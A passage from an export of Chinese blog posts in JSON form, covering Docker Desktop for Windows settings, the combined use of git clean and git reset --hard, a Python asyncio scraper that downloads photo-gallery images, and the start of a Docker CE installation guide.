href=\"https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-configuration-file\" rel=\"nofollow\">守护进程配置文件</a></p>\n\t</li>\n\t<li>\n\t<p><a href=\"https://docs.docker.com/engine/reference/commandline/dockerd/#linux-configuration-file\" rel=\"nofollow\">Linux配置文件</a></p>\n\t</li>\n\t<li>\n\t<p><a href=\"https://docs.docker.com/engine/reference/commandline/dockerd/#windows-configuration-file\" rel=\"nofollow\">Windows配置文件</a></p>\n\t</li>\n</ul><h3>Kubernetes</h3>\n\n<p><a href=\"https://docs.docker.com/docker-for-windows/kubernetes/\" rel=\"nofollow\">适用于Windows的Docker Desktop上的Kubernetes</a> 在 <a href=\"https://docs.docker.com/docker-for-windows/edge-release-notes/#docker-community-edition-18020-ce-rc1-win50-2018-01-26\" rel=\"nofollow\">18.02 Edge（win50）</a>及更高版本以及<a href=\"https://docs.docker.com/docker-for-windows/edge-release-notes/#docker-community-edition-18060-ce-win70-2018-07-25\" rel=\"nofollow\">18.06 Stable（win70）</a>及更高版本中<a href=\"https://docs.docker.com/docker-for-windows/edge-release-notes/#docker-community-edition-18060-ce-win70-2018-07-25\" rel=\"nofollow\">可用</a>。</p>\n\n<p><img alt=\"启用Kubernetes\" class=\"has\" src=\"http://www.pianshen.com/images/365/41c11659b01c97307aa57d0bc1391685.png\"></p>\n\n<p>从Docker Desktop for Windows 18.02 CE Edge和18.06 CE Stable可以在Windows主机上运行独立的Kubernetes服务器，以便您可以测试在Kubernetes上部署Docker工作负载。</p>\n\n<p>Kubernetes客户端命令<code>kubectl</code>包含并配置为连接到本地Kubernetes服务器。如果您<code>kubectl</code>已经安装并指向某些其他环境（例如<code>minikube</code>GKE集群），请务必更改上下文，以便<code>kubectl</code>指向<code>docker-for-desktop</code>：</p>\n\n<pre class=\"has\">\n<code>&lt;span style=\"color:#33444c\"&gt;&lt;span style=\"color:#333333\"&gt;&lt;code&gt;&gt; kubectl config get-contexts\n&gt; kubectl config use-context docker-for-desktop\n&lt;/code&gt;&lt;/span&gt;&lt;/span&gt;</code></pre>\n\n<p>您也可以通过Docker Desktop for Windows菜单更改它：</p>\n\n<p><img alt=\"改变Kubernetes背景\" class=\"has\" src=\"http://www.pianshen.com/images/224/f7060005ea22b41c624bd1e54ca42688.png\"></p>\n\n<p>如果您<code>kubectl</code>通过其他方法安装并遇到冲突，请将其删除。</p>\n\n<ul><li>\n\t<p>要启用Kubernetes支持并安装作为Docker容器运行的独立Kubernetes实例，请选择<strong>Enable Kubernetes</strong>并单击 <strong>Apply and restart</strong>按钮。</p>\n\n\t<p>需要Internet连接。运行Kubernetes服务器所需的映像将被下载并实例化为容器，并且</p>\n\n\t<blockquote>\n\t<p>已安装Program Files \\ Docker \\ Docker \\ Resources \\ bin \\ kubectl.exe`命令。</p>\n\t</blockquote>\n\t</li>\n\t<li>\n\t<p>默认情况下，Kubernetes容器对命令是隐藏的<code>docker service ls</code>，因为不支持手动管理它们。要使它们可见，请选择<strong>Show system containers（advanced）</strong>，然后单击<strong>Apply并重新启动</strong>。大多数用户不需要此选项。</p>\n\t</li>\n\t<li>\n\t<p>要随时禁用Kubernetes支持，请取消选择“ <strong>启用Kubernetes”</strong>。停止并删除Kubernetes容器，并删除该 <code>/usr/local/bin/kubectl</code>命令。</p>\n\n\t<p>有关使用Kubernetes与Docker Desktop for Windows集成的更多信息，请<a href=\"https://docs.docker.com/docker-for-windows/kubernetes/\" rel=\"nofollow\">参阅在Kubernetes上部署</a>。</p>\n\t</li>\n</ul><h3>重启</h3>\n\n<p>在“重置”选项卡上，您可以重新启动Docker或重置其配置。</p>\n\n<p><img alt=\"重启\" class=\"has\" src=\"http://www.pianshen.com/images/90/37a86e60fb94204cf50e5270f7108ffa.png\"></p>\n\n<ul><li>\n\t<p><strong>重启Docker</strong> - 关闭并重新启动Docker应用程序。</p>\n\t</li>\n\t<li>\n\t<p><strong>重置为出厂默认值</strong> - 将Docker重置为出厂默认值。这在Docker停止工作或无响应的情况下非常有用。</p>\n\t</li>\n</ul><h3>诊断和反馈</h3>\n\n<p>请访问我们的<a href=\"https://docs.docker.com/docker-for-windows/troubleshoot/\" rel=\"nofollow\">日志和故障排除</a>指南了解更多详情。</p>\n\n<p>登录我们的<a href=\"https://forums.docker.com/c/docker-for-windows\" rel=\"nofollow\">Docker Desktop for Windows论坛</a>，获取社区帮助，查看当前用户主题或加入讨论。</p>\n\n<p>登录到<a href=\"https://github.com/docker/for-win/issues\">GitHub</a>上的<a href=\"https://github.com/docker/for-win/issues\">Docker Desktop for Windows问题</a>以报告错误或问题并查看社区报告的问题。</p>\n\n<p>要提供有关文档的反馈或自行更新，请使用每个文档页面底部的反馈选项。</p>\n\n<h2>在Windows和Linux容器之间切换</h2>\n\n<p>从Docker Desktop for Windows菜单中，您可以切换Docker CLI与之对话的守护进程（Linux或Windows）。选择“ <strong>切换到Windows容器”</strong>以使用Windows容器，或选择“ <strong>切换到Linux容器”</strong>以使用Linux容器（默认设置）。</p>\n\n<p><img alt=\"Windows-Linux容器类型切换\" class=\"has\" src=\"http://www.pianshen.com/images/236/8696df696b86dc1d663eec790257525c.png\"></p>\n\n<p>有关Windows容器的更多信息，请参阅此文档：</p>\n\n<ul><li>\n\t<p>有关<a href=\"https://docs.microsoft.com/en-us/virtualization/windowscontainers/about/index\" rel=\"nofollow\">Windows容器的</a> Microsoft文档。</p>\n\t</li>\n\t<li>\n\t<p><a href=\"https://blog.docker.com/2016/09/build-your-first-docker-windows-server-container/\" rel=\"nofollow\">构建并运行您的第一个Windows服务器容器（博客文章）</a> 可以快速浏览如何在Windows 10和Windows Server 2016评估版本上构建和运行本机Docker Windows容器。</p>\n\t</li>\n\t<li>\n\t<p><a href=\"https://github.com/docker/labs/blob/master/windows/windows-containers/README.md\">Windows Containers入门（实验室）</a> 向您展示了如何将<a href=\"https://github.com/aspnet/MusicStore/blob/dev/README.md\">MusicStore</a> 应用程序与Windows容器一起使用。MusicStore是一个标准的.NET应用程序， <a href=\"https://github.com/friism/MusicStore\">在这里分叉使用容器</a>，是多容器应用程序的一个很好的例子。</p>\n\t</li>\n\t<li>\n\t<p>要了解如何从本地主机连接到Windows容器，请参阅： <a href=\"https://docs.docker.com/docker-for-windows/troubleshoot/#limitations-of-windows-containers-for-localhost-and-published-ports\" rel=\"nofollow\">Windows容器<code>localhost</code>和已发布端口的限制</a></p>\n\t</li>\n</ul><blockquote>\n<p><strong>设置对话框随Windows容器一起更改</strong></p>\n\n<p>切换到Windows容器时，“设置”对话框仅显示那些处于活动状态并应用于Windows容器的选项卡：</p>\n\n<ul><li><a href=\"https://docs.docker.com/docker-for-windows/#general\" rel=\"nofollow\">一般</a></li>\n\t<li><a href=\"https://docs.docker.com/docker-for-windows/#proxies\" rel=\"nofollow\">代理</a></li>\n\t<li><a href=\"https://docs.docker.com/docker-for-windows/#docker-daemon\" rel=\"nofollow\">Docker守护进程</a></li>\n\t<li><a href=\"https://docs.docker.com/docker-for-windows/#diagnose-and-feedback\" rel=\"nofollow\">诊断和反馈</a></li>\n\t<li><a href=\"https://docs.docker.com/docker-for-windows/#reset\" rel=\"nofollow\">重启</a></li>\n</ul><p>如果在Windows容器模式下设置代理或守护程序配置，则这些仅适用于Windows容器。如果切换回Linux容器，则代理和守护程序配置将返回到您为Linux容器设置的内容。您的Windows容器设置将保留，并在您切换回时再次可用。</p>\n</blockquote>\n\n<h2>添加TLS证书</h2>\n\n<p>对于Docker守护程序，您可以添加受信任的<strong>证书颁发机构（CA）</strong>，以验证注册表服务器证书和<strong>客户端证书</strong>，以便向注册表进行身份验证。</p>\n\n<p>请参阅<a href=\"https://docs.docker.com/docker-for-windows/faqs/#how-do-i-add-custom-ca-certificates\" rel=\"nofollow\">如何添加自定义CA证书？</a> 以及<a href=\"https://docs.docker.com/docker-for-windows/faqs/#how-do-i-add-client-certificates\" rel=\"nofollow\">如何添加客户端证书？</a> 在常见问题解答中。</p>\n\n<h2>Docker Hub</h2>\n\n<p>从Docker Desktop for Windows菜单中选择<strong>登录/创建Docker ID</strong>以访问您的<a href=\"https://hub.docker.com/\" rel=\"nofollow\">Docker Hub</a>帐户。登录后，您可以直接从Docker Desktop for Windows菜单访问Docker Hub存储库。</p>\n                                    </div>", "log_PostTime": 1584891097, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "git clean和git reset结合用法", "log_Intro": "git clean和git reset结合用法", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>git clean命令用来从你的工作目录中删除所有没有tracked过的文件</p>\n\n<p>git clean经常和git reset --hard一起结合使用. 记住reset只影响被track过的文件, 所以需要clean来删除没有track过的文件. 结合使用这两个命令能让你的工作目录完全回到一个指定的&lt;commit&gt;的状态</p>\n\n<p>用法</p>\n\n<p>git clean -n</p>\n\n<p>是一次clean的演习, 告诉你哪些文件会被删除. 记住他不会真正的删除文件, 只是一个提醒</p>\n\n<p>git clean -f</p>\n\n<p>删除当前目录下所有没有track过的文件. 他不会删除.gitignore文件里面指定的文件夹和文件, 不管这些文件有没有被track过</p>\n\n<p>git clean -f &lt;path&gt;</p>\n\n<p>删除指定路径下的没有被track过的文件</p>\n\n<p>git clean -df</p>\n\n<p>删除当前目录下没有被track过的文件和文件夹</p>\n\n<p>git clean -xf</p>\n\n<p>删除当前目录下所有没有track过的文件. 不管他是否是.gitignore文件里面指定的文件夹和文件</p>\n\n<p>git reset --hard和git clean -f是一对好基友. 结合使用他们能让你的工作目录完全回退到最近一次commit的时候</p>\n\n<p>git clean对于刚编译过的项目也非常有用. 如, 他能轻易删除掉编译后生成的.o和.exe等文件. 这个在打包要发布一个release的时候非常有用</p>\n\n<p>下面的例子要删除所有工作目录下面的修改, 包括新添加的文件. 假设你已经提交了一些快照了, 而且做了一些新的开发</p>\n\n<p>git reset --hard</p>\n\n<p>git clean -df</p>\n\n<p>如果发现还有一些新目录存在,用rm -rf 删除,checkout 到指定日志目录ID</p>\n\n<p>运行后, 工作目录和缓存区回到最近一次commit时候一摸一样的状态，git status会告诉你这是一个干净的工作目录, 又是一个新的开始了！</p>\n                                    </div>", "log_PostTime": 1584891098, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python协程爬取美女图(内有福利，你懂得~)", "log_Intro": "Python协程爬取美女图(内有福利，你懂得~)", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>项目说明：</p>\n\n<p>　　1、项目介绍</p>\n\n<p>　　　  本项目使用Python提供的协程+scrapy中的选择器的使用(相当好用)实现爬取妹子图的(福利图)图片，这个学会了，某榴什么的、pow(2, 10)是吧！</p>\n\n<p>　　2、用到的知识点</p>\n\n<p>　　　  本项目中会用到以下知识点</p>\n\n<p>　　　　① Python的编程(本人使用版本3.6.2)</p>\n\n<p>　　　　② 使用scrapy中的css选择器</p>\n\n<p>　　　　③ 使用async协程</p>\n\n<p>　　　　④ 使用aiohttp异步访问url</p>\n\n<p>　　　　⑤ 使用aiofiles异步保存文件</p>\n\n<p>　　3、 项目效果图</p>\n\n<p>            <img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20190420000911922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p> </p>\n\n<p>项目实现：</p>\n\n<p>　　我们最终的目的是把图片的标题替换成需要保存的目录，下面的图片呢，就按着网页上图片的名称保存~，有了这个需求以后，ok，社会我demon哥，人很话不多，开干！</p>\n\n<p>　　 我们需要网站的入口，入口如下~就爬取萌妹子吧！</p>\n\n<p>　　 妹子图中萌妹分类的网站入口：<a href=\"https://www.mzitu.com/mm/\" rel=\"nofollow\">https://www.mzitu.com/mm/</a></p>\n\n<p>　　 打开萌妹子的入口链接以后，我们需要分析下网页中结构，然后通过分析页面，获取我们有用的内容：</p>\n\n<p>　　 通过入口我们得知，url地址中，有两个我们需要关系的点，一个是妹子图的妹子类型，一个是要获取页面的页码，如果获取多页的话，也就是替换成不同的页码即可(图如下)</p>\n\n<p>　　   </p>\n\n<p>　　 分析完上面的页面以后，我们在来分析当前页中需要提取的信息 ，使用Chrome浏览器打开开发者模式(windows是F12，MacOS是command+option+i)</p>\n\n<p>　  　</p>\n\n<p>　　  点击刚刚选中妹子的url的地址，我们在来分析这里面的有用信息</p>\n\n<p>　　    </p>\n\n<p>　　 信息提取就到这里，我们下面需要使用css选择器，提取url然后开始写方法，来下载这些图片</p>\n\n<p> </p>\n\n<p>　　 没有安装的scrapy的赶紧去pip3 install scrapy一下，要么您老就右上角的小叉叉退出吧~ 不然没办法进行了！</p>\n\n<p>　　  Scrapy提供一个Shell的参数命令了，在这个参数后面加上你要提取页面中的url地址，就可以进入到scrapy shell中，在里面可以通过css xpath选择器调试提取信息，用法如下：</p>\n\n<p>　　  在终端输入: scrapy shell <a href=\"https://www.mzitu.com/mm/\" rel=\"nofollow\">https://www.mzitu.com/mm/</a></p>\n\n<p>　  　 <img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20190420002340546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p>　　 出现上面的即可，这里面有个response，我们可以通过response.css或者reponses.xpath获取url的数据，ok..我这里使用css来提取，为嘛?! 简单呗~</p>\n\n<p>　　  css的具体语法嘛~~大家不会的话，可以自行百度，或者去菜鸟站补一补知识，我这人比较懒，我就不讲了！直接告诉你们怎么提取吧~可以通过Chrome给我提供的开发者工具来获取css选择器的表达式，请看下图</p>\n\n<p>　　   </p>\n\n<p>　　 上面图的图很眼熟对吧，嗯，这是哪个主页图，我们需要在当前页面中获取所有妹子的url地址，然后在进入到每个妹子的url地址中获取这个妹子的所有图片！首先先来获取当前页面的所有妹子的url地址，切换到scrap shell中，通过response.css来提取信息</p>\n\n<p>　　 提取妹子的url地址:  response.css('#maincontent a::attr(href)').extract()</p>\n\n<p>　　 </p>\n\n<p>　　 嘿~，当前页面的中的所有妹子的url都有了，那就好办了呀，在进入这些地址中逐个获取妹子独立页面中的url地址，然后下载就好咯！但是，大家有木有发现，这些页面中的url有重复的，怎么办呢，用set可以去重哦，先来写个获取当前页面的简单的方法，一会我们在修改这个方法。</p>\n\n<p> 1 import requests<br>\n 2 from scrapy import Selector<br>\n 3 <br>\n 4 <br>\n 5 def get_page_items(*, start_page_num: int=1, end_page_num: int=2, step: int=1):<br>\n 6     items = []<br>\n 7     for page_num in range(start_page_num, end_page_num, step):<br>\n 8         base_url = 'https://www.mzitu.com/a/page/{page_num}.html'<br>\n 9         req = requests.get(base_url.format(genre='cute', page_num=1))<br>\n10         content = req.content.decode('gbk')<br>\n11         selector = Selector(text=content)<br>\n12         item_urls = list(set(selector.css('#maincontent a::attr(href)').extract()))<br>\n13         items.extend(url for url in item_urls if url.startswith('https://www.mzitu.com/mm/'))<br>\n14     return items<br>\n15 <br>\n16 <br>\n17 print(get_page_items())</p>\n\n<p><br>\n上面的代码可以供我们拿下指定页面中的所有漂亮小姐姐的url地址哦~，有了这些漂亮小姐姐的url，进入这个url以后，在提取小姐姐页面的所有url就可以下载啦~！</p>\n\n<p> 1 import requests<br>\n 2 from scrapy import Selector<br>\n 3 <br>\n 4 <br>\n 5 def get_page_items(*, start_page_num: int=1, end_page_num: int=2, step: int=1):<br>\n 6     items = []<br>\n 7     for page_num in range(start_page_num, end_page_num, step):<br>\n 8         base_url = 'http://www.meizitu.com/a/{genre}_{page_num}.html'<br>\n 9         req = requests.get(base_url.format(genre='cute', page_num=1))<br>\n10         content = req.content.decode('gbk')<br>\n11         selector = Selector(text=content)<br>\n12         item_urls = list(set(selector.css('#maincontent a::attr(href)').extract()))<br>\n13         items.extend(url for url in item_urls if url.startswith('https://www.mzitu.com/mm/'))<br>\n14     return items<br>\n15 <br>\n16 <br>\n17 def get_images(item):<br>\n18     req = requests.get(item)<br>\n19     content = req.content.decode('gbk')<br>\n20     selector = Selector(text=content)<br>\n21     image_urls = list(set(selector.css('#maincontent p img::attr(src)').extract()))<br>\n22     print(image_urls)<br>\n23 <br>\n24 <br>\n25 for item in get_page_items():<br>\n26     get_images(item)</p>\n\n<p><br>\n上面代码执行的结果为：</p>\n\n<p>可以看到的效果，所有小姐姐的下载图片的地址都已经拿到了，但是上面的代码有两个问题，聪明的小伙伴，可能已经发现了，上面代码的重合性太高，那些获取url的咚咚，都可以整合，在下面的一版，我们来改写这个函数，有了这些图片的地址，我们只需要调取某个函数或者方法，来下载这些图片保存到本地即可，怎么玩?! 往下看.....</p>\n\n<p> 1 # _*_coding: utf-8_*_<br>\n 2 import os<br>\n 3 from time import perf_counter<br>\n 4 from functools import wraps<br>\n 5 <br>\n 6 import requests<br>\n 7 from scrapy import Selector<br>\n 8 \"\"\"<br>\n 9 -------------------------------------------------<br>\n10    File Name：     妹子图_串行<br>\n11    Description :<br>\n12    Author :        Lanson<br>\n13    date：          20/04/2019<br>\n14 -------------------------------------------------<br>\n15    Change Activity:<br>\n16                    20/04/2019:<br>\n17 -------------------------------------------------<br>\n18 \"\"\"<br>\n19 __author__ = 'lanson'<br>\n20 <br>\n21 <br>\n22 def timer(func):<br>\n23     \"\"\"<br>\n24     :param func: 装饰器的函数，记录方法所消耗的时间<br>\n25     :return:<br>\n26     \"\"\"<br>\n27     @wraps(func)<br>\n28     def wrapper(*args, **kwargs):<br>\n29         start_time = perf_counter()<br>\n30         result = func(*args, **kwargs)<br>\n31         end_time = perf_counter()<br>\n32         cls_name = func.__name__<br>\n33         fmt = '{cls_name} {args} spend time: {time:.5f}'<br>\n34         print(fmt.format(cls_name=cls_name, args=args, time=end_time - start_time))<br>\n35         return result<br>\n36     return wrapper<br>\n37 <br>\n38 <br>\n39 def get_content_css(url):<br>\n40     req = requests.get(url)<br>\n41     content = req.content.decode('gbk')<br>\n42     selector = Selector(text=content)<br>\n43     return selector<br>\n44 <br>\n45 <br>\n46 def get_page_items(*, start_page_num: int=1, end_page_num: int=2, step: int=1):<br>\n47     items = []<br>\n48     for page_num in range(start_page_num, end_page_num, step):<br>\n49         base_url = 'https://www.mzitu.com/mm/page/{page_num}.html'<br>\n50         selector = get_content_css(base_url.format(genre='cute', page_num=page_num))<br>\n51         item_urls = list(set(selector.css('#maincontent a::attr(href)').extract()))<br>\n52         items.extend(url for url in item_urls if url.startswith('https://www.mzitu.com/mm/'))<br>\n53     return items<br>\n54 <br>\n55 <br>\n56 def get_images(item):<br>\n57     selector = get_content_css(item)<br>\n58     image_urls = list(set(selector.css('#maincontent p img::attr(src)').extract()))<br>\n59     dir_name = selector.css('#maincontent div.metaRight h2 a::text').extract_first()<br>\n60     'ok' if os.path.exists(dir_name) else os.mkdir(dir_name)<br>\n61     for url in image_urls:<br>\n62         download_image(dir_name, url)<br>\n63 <br>\n64 <br>\n65 @timer<br>\n66 def download_image(dir_name, image_url):<br>\n67     headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) '<br>\n68                              'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}<br>\n69     req = requests.get(image_url, headers=headers)<br>\n70     image = req.content<br>\n71     filename = image_url.rsplit('/', 1)[-1]<br>\n72     save_path = os.path.join(dir_name, filename)<br>\n73     with open(save_path, 'wb') as f:<br>\n74         f.write(image)<br>\n75 <br>\n76 <br>\n77 if __name__ == \"__main__\":<br>\n78     start = perf_counter()<br>\n79     for item in get_page_items():<br>\n80         get_images(item)<br>\n81     end = perf_counter()<br>\n82     print(format('end', '*^100'))<br>\n83     print('download all images cost time:{:.3f}'.format(end - start))</p>\n\n<p><br>\n上面的代码可以保证图片保存到本地，那么基本的代码逻辑没有问题了，保存文件(download_image)也实现了~， 但是  但是这不是我们想要的效果，这玩意很慢的，一个一个并行下来的，要TMD天荒地老呀！</p>\n\n<p>卧槽，不能忍受呀，一个页面就要用121秒的时间，这尼玛的要是10页20页的不得疯了呀！一定要改，改代码，改成协程~，以下是三页的数据才用时190秒呀，提升了不是一点半点呀！</p>\n\n<p> </p>\n\n<p>说干就干，改成协程，直接上全部代码吧！因为...我懒得...写了，这篇博客...写了将近五个小时了...卧槽！要疯了~</p>\n\n<p>  1 # _*_coding: utf-8_*_<br>\n  2 import os<br>\n  3 import asyncio<br>\n  4 from functools import wraps<br>\n  5 from time import perf_counter<br>\n  6 <br>\n  7 import aiohttp<br>\n  8 import aiofiles<br>\n  9 from scrapy import Selector<br>\n 10 \"\"\"<br>\n 11 -------------------------------------------------<br>\n 12    File Name：     妹子图<br>\n 13    Description :<br>\n 14    Author :        Lanson<br>\n 15    date：          20/04/2019<br>\n 16 -------------------------------------------------<br>\n 17    Change Activity:<br>\n 18                    20/04/2019:<br>\n 19 -------------------------------------------------<br>\n 20 \"\"\"<br>\n 21 __author__ = 'lanson'<br>\n 22 <br>\n 23 <br>\n 24 def timer(func):<br>\n 25     \"\"\"<br>\n 26     :param func: 装饰器的函数，记录方法所消耗的时间<br>\n 27     :return:<br>\n 28     \"\"\"<br>\n 29     @wraps(func)<br>\n 30     def wrapper(*args, **kwargs):<br>\n 31         start_time = perf_counter()<br>\n 32         result = func(*args, **kwargs)<br>\n 33         end_time = perf_counter()<br>\n 34         cls_name = func.__name__<br>\n 35         print('{cls_name} spend time: {time:.5f}'.format(cls_name=cls_name, time=end_time - start_time))<br>\n 36         return result<br>\n 37     return wrapper<br>\n 38 <br>\n 39 <br>\n 40 class MeiZiTuDownload:<br>\n 41     def __init__(self, *, genre: str='cute', start_page_num: int=1, end_page_num: int=5, step: int=1):<br>\n 42         self.base_url = 'http://www.meizitu.com/a/{genre}_{page_num}.html'<br>\n 43         self.start_num = start_page_num<br>\n 44         self.end_num = end_page_num<br>\n 45         self.step = step<br>\n 46         self.genre = genre<br>\n 47         self.headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) '<br>\n 48                                       'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}<br>\n 49 <br>\n 50     async def get_html_content(self, url: str):<br>\n 51         \"\"\"<br>\n 52         :param url: 网页的url地址<br>\n 53         :return:    网页的html源码<br>\n 54         \"\"\"<br>\n 55         req = await aiohttp.request('GET', url, headers=self.headers)<br>\n 56         content = await req.read()<br>\n 57         content = content.decode('gbk')<br>\n 58         return content<br>\n 59 <br>\n 60     async def get_page_item(self, page_num: int):<br>\n 61         \"\"\"<br>\n 62         :param page_num: 获取网页中的每一页中的具体的url地址<br>\n 63         :return:<br>\n 64         \"\"\"<br>\n 65         item_url = self.base_url.format(genre=self.genre, page_num=page_num)<br>\n 66         content = await self.get_html_content(item_url)<br>\n 67         selector = Selector(text=content)<br>\n 68         urls = list(set(selector.css('#maincontent a::attr(href)').extract()))<br>\n 69         page_items = (url for url in urls if url.startswith('https://www.mzitu.com/mm/'))<br>\n 70         for item in page_items:<br>\n 71             await self.get_item(item)<br>\n 72 <br>\n 73     async def get_item(self, item: str):<br>\n 74         \"\"\"<br>\n 75         :param item: 单独的下载页面<br>\n 76         :return:<br>\n 77         \"\"\"<br>\n 78         item_content = await self.get_html_content(item)<br>\n 79         selector = Selector(text=item_content)<br>\n 80         dir_name = selector.css('#maincontent div.metaRight h2 a::text').extract_first()<br>\n 81         image_urls = selector.css('#picture p img::attr(src)').extract()<br>\n 82         'ok' if os.path.exists(dir_name) else os.mkdir(dir_name)<br>\n 83         for image_url in image_urls:<br>\n 84             image_name = image_url.rsplit('/', 1)[-1]<br>\n 85             save_path = os.path.join(dir_name, image_name)<br>\n 86             await self.download_images(save_path, image_url)<br>\n 87 <br>\n 88     async def download_images(self, save_path: str, image_url: str):<br>\n 89         \"\"\"<br>\n 90         :param save_path: 保存图片的路径<br>\n 91         :param image_url: 图片的下载的url地址<br>\n 92         :return:<br>\n 93         \"\"\"<br>\n 94         req = await aiohttp.request('GET', image_url, headers=self.headers)<br>\n 95         image = await req.read()<br>\n 96         fp = await aiofiles.open(save_path, 'wb')<br>\n 97         await fp.write(image)<br>\n 98 <br>\n 99     async def __call__(self, page_num: int):<br>\n100         await self.get_page_item(page_num)<br>\n101 <br>\n102     def __repr__(self):<br>\n103         cls_name = type(self).__name__<br>\n104         return '{cls_name}{args}'.format(cls_name=cls_name, args=(self.genre, self.start_num, self.end_num, self.step))<br>\n105 <br>\n106 <br>\n107 if __name__ == \"__main__\":<br>\n108     start = perf_counter()<br>\n109     download = MeiZiTuDownload(genre='cute')<br>\n110     loop = asyncio.get_event_loop()<br>\n111     to_do = [download(num) for num in range(1, 4)]<br>\n112     wait_future = asyncio.wait(to_do)<br>\n113     resp, _ = loop.run_until_complete(wait_future)<br>\n114     loop.close()<br>\n115     end = perf_counter()<br>\n116     func_name = download.__class__.__name__<br>\n117     spend_time = end - start<br>\n118     print(format('end', '*^100'))<br>\n119     print('{func_name} spend time: {time:.5f}'.format(func_name=func_name, time=spend_time))<br>\n协程的使用，大家移步到廖大神的哪里学习下吧~~~，我就不讲了...不然我要疯了...我要看会电影，缓一会。</p>\n                                    </div>", "log_PostTime": 1584891099, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Docker的安装和版本详细介绍", "log_Intro": "Docker的安装和版本详细介绍", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1><strong>1.Docker-CE和Docker-EE版本介绍</strong></h1>\n\n<p>Docker-CE指Docker社区版，由社区维护和提供技术支持，为免费版本，适合个人开发人员和小团队使用。 Docker-EE指Docker企业版，为收费版本，由售后团队和技术团队提供技术支持，专为企业开发和IT团队而设计。 相比Docker-EE，增加一些额外功能，更重要的是提供了更安全的保障。 此外，Docker的发布版本分为Stable版和Edge版，区别在于前者是按季度发布的稳定版(发布慢)，后者是按月发布的边缘版(发布快)。 通常情况下，Docker-CE足以满足我们的需求。后面学习主要针对Docker-CE进行学习。</p>\n\n<p> </p>\n\n<h1>2.Centos 上安装 Docker-CE</h1>\n\n<p>系统要求：<a href=\"https://docs.docker.com/install/linux/docker-ce/centos/#install-using-the-repository\" rel=\"nofollow\">CentOS7 查看官方源安装教程</a>、<a href=\"https://help.aliyun.com/document_detail/60742.html\" rel=\"nofollow\">阿里源安装教程(建议)</a></p>\n\n<p><a href=\"http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo\" rel=\"nofollow\">http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</a>  阿里镜像地址</p>\n\n<pre class=\"has\">\n<code>yum install -y yum-utils device-mapper-persisent-data lvm2\nyum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo\nvi /etc/yum.repos.d/docker-ce.repo\nyum makecache fast\nyum -y install docker-ce\nservice docker start\n</code></pre>\n\n<p><img alt=\"\" class=\"has\" height=\"267\" src=\"https://img-blog.csdnimg.cn/20190420143246853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"770\"></p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20190420145208709.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p>CentOS安装Docker-CE安装成功后，使用 docker version 命令查看</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20190420150221730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p> </p>\n\n<h1>3.Ubuntu 上安装 Docker-CE</h1>\n\n<p>系统要求：Ubuntu 14.04及其以上版本 <a href=\"https://docs.docker.com/install/linux/docker-ce/ubuntu/\" rel=\"nofollow\">查看官方源安装教程</a>、<a href=\"https://help.aliyun.com/document_detail/60742.html\" rel=\"nofollow\">阿里源安装教程(建议)</a></p>\n\n<p><img alt=\"\" class=\"has\" height=\"205\" src=\"https://img-blog.csdnimg.cn/20190420150636571.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"795\"></p>\n\n<p>Ubuntu上安装Docker-CE安装成功后，使用 docker version查看</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20190420153638960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<h1>4.Windows/Mac 上安装 Docker-CE</h1>\n\n<p>系统要求：</p>\n\n<p><img alt=\"\" class=\"has\" height=\"227\" src=\"https://img-blog.csdnimg.cn/20190420153814108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"814\"></p>\n\n<p><a href=\"http://get.daocloud.io/#install-docker-for-mac-windows\" 